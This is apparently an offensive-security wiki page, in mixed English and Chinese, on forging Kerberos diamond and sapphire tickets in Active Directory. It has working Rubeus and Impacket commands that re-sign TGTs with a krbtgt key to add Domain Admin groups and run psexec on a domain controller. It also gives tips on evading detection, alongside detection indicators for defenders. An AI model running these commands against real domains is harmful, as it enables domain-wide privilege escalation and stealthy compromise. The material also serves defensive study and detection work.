# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Like a golden ticket**, a diamond ticket is a TGT which can be used to **access any service as any user**. A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use. Because 域控制器 don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

There are two common techniques to detect the use of golden tickets:

- Look for TGS-REQs that have no corresponding AS-REQ.
- Look for TGTs that have silly values, such as Mimikatz's default 10-year lifetime.

A **diamond ticket** is made by **modifying the fields of a legitimate TGT that was issued by a DC**. This is achieved by **requesting** a **TGT**, **decrypting** it with the domain's krbtgt hash, **modifying** the desired fields of the ticket, then **re-encrypting it**. This **overcomes the two aforementioned shortcomings** of a golden ticket because:

- TGS-REQs will have a preceding AS-REQ.
- The TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy. Even though these can be accurately forged in a golden ticket, it's more complex and open to mistakes.

### 要求与工作流程

- **Cryptographic material**: the krbtgt AES256 key (preferred) or NTLM hash in order to decrypt and re-sign the TGT.
- **Legitimate TGT blob**: obtained with `/tgtdeleg`, `asktgt`, `s4u`, or by exporting tickets from memory.
- **Context data**: the target user RID, group RIDs/SIDs, and (optionally) LDAP-derived PAC attributes.
- **Service keys** (only if you plan to re-cut service tickets): AES key of the service SPN to be impersonated.

1. 获取一个受控用户的 TGT via AS-REQ（Rubeus `/tgtdeleg` 很方便，因为它强制客户端在没有凭据的情况下执行 Kerberos GSS-API 流程）。
2. 使用 krbtgt key 解密返回的 TGT，修补 PAC 属性（用户、组、登录信息、SIDs、设备声明等）。
3. 使用相同的 krbtgt key 对票据重新加密/签名并将其注入到当前登录会话中（`kerberos::ptt`, `Rubeus.exe ptt`...）。
4. 可选地，通过提供有效的 TGT blob 加上目标服务 key，对 service ticket 重复该过程，以在网络上保持隐蔽。

### Rubeus 更新的实战技巧 (2024+)

Recent work by Huntress modernized the `diamond` action inside Rubeus by porting the `/ldap` and `/opsec` improvements that previously only existed for golden/silver tickets. `/ldap` now auto-populates accurate PAC attributes straight from AD (user profile, logon hours, sidHistory, domain policies), while `/opsec` makes the AS-REQ/AS-REP flow indistinguishable from a Windows client by performing the two-step pre-auth sequence and enforcing AES-only crypto. This dramatically reduces obvious indicators such as blank device IDs or unrealistic validity windows.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap`（可选 `/ldapuser` & `/ldappassword`）查询 AD 和 SYSVOL，以镜像目标用户的 PAC 策略数据。
- `/opsec` 强制进行类似 Windows 的 AS-REQ 重试，清零噪声标志并坚持使用 AES256。
- `/tgtdeleg` 保持不接触受害者的明文密码或 NTLM/AES 密钥，同时仍返回可解密的 TGT。

### Service-ticket recutting

同样的 Rubeus 刷新增加了将 diamond technique 应用于 TGS blobs 的能力。通过向 `diamond` 提供一个 **base64-encoded TGT**（来自 `asktgt`、`/tgtdeleg` 或先前伪造的 TGT）、**service SPN**，和 **service AES key**，你可以在不接触 KDC 的情况下伪造出逼真的 service tickets——实际上是一种更隐蔽的 silver ticket。
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
This workflow is ideal when you already control a service account key (e.g., dumped with `lsadump::lsa /inject` or `secretsdump.py`) and want to cut a one-off TGS that perfectly matches AD policy, timelines, and PAC data without issuing any new AS/TGS traffic.

### Sapphire-style PAC swaps (2025)

一种较新的变体有时称为 **sapphire ticket**，它将 Diamond 的 “real TGT” 基础与 **S4U2self+U2U** 结合，用来窃取一个具有特权的 PAC 并将其放入你自己的 TGT 中。你不需要编造额外的 SIDs，而是为具有高权限的用户请求一个 U2U S4U2self 票证，提取该 PAC，并在使用 krbtgt 密钥重新签名之前将其拼接进你的合法 TGT 中。因为 U2U 设置了 `ENC-TKT-IN-SKEY`，所以最终的报文流程看起来像一次合法的用户到用户交换。

Minimal Linux-side reproduction with Impacket's patched `ticketer.py` (adds sapphire support):
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333' \
--u2u --s4u2self
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
Key OPSEC tells when using this variant:

- TGS-REQ 会携带 `ENC-TKT-IN-SKEY` 和 `additional-tickets`（受害者 TGT）——在正常流量中很少见。
- `sname` 通常等于请求用户（自助访问），Event ID 4769 显示调用者和目标为相同的 SPN/用户。
- 预计会看到配对的 4768/4769 条目：来自相同客户端计算机但 CNAMES 不同（低权限请求者 vs. 拥有特权 PAC 的主体）。

### OPSEC & detection notes

- 传统的猎杀启发式（例如无 AS 的 TGS、十年级别的有效期）对 golden tickets 仍然适用，但 diamond tickets 主要在 **PAC 内容或组映射看起来不可能** 时暴露。请填充 PAC 的每个字段（logon hours、user profile paths、device IDs 等），以免自动化比对立即标记伪造。
- **不要过度订阅组/RIDs**。如果只需要 `512`（Domain Admins）和 `519`（Enterprise Admins），就停在那，并确保目标账户在 AD 的其他位置也合理地属于这些组。过多的 `ExtraSids` 会暴露。
- Sapphire-style 交换会留下 U2U 指纹：在 4769 中出现 `ENC-TKT-IN-SKEY` + `additional-tickets` + `sname == cname`，并且随后会有源自伪造票据的 4624 登录。应关联这些字段，而不仅仅关注无 AS-REQ 的空档。
- 由于 CVE-2026-20833，Microsoft 已开始逐步淘汰 **RC4 service ticket issuance**；在 KDC 上强制使用仅 AES 的 etypes 既可增强域安全，也与 diamond/sapphire 工具链保持一致（/opsec 已强制使用 AES）。在伪造的 PAC 中混入 RC4 会越来越显眼。
- Splunk 的 Security Content 项目发布了用于 diamond tickets 的攻击范围遥测以及检测规则，例如 *Windows Domain Admin Impersonation Indicator*，该规则关联异常的 Event ID 4768/4769/4624 序列和 PAC 组更改。重放该数据集（或使用上面的命令生成自己的数据）有助于验证 SOC 对 T1558.001 的覆盖，同时给出可用于规避的具体告警逻辑。

## References

- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
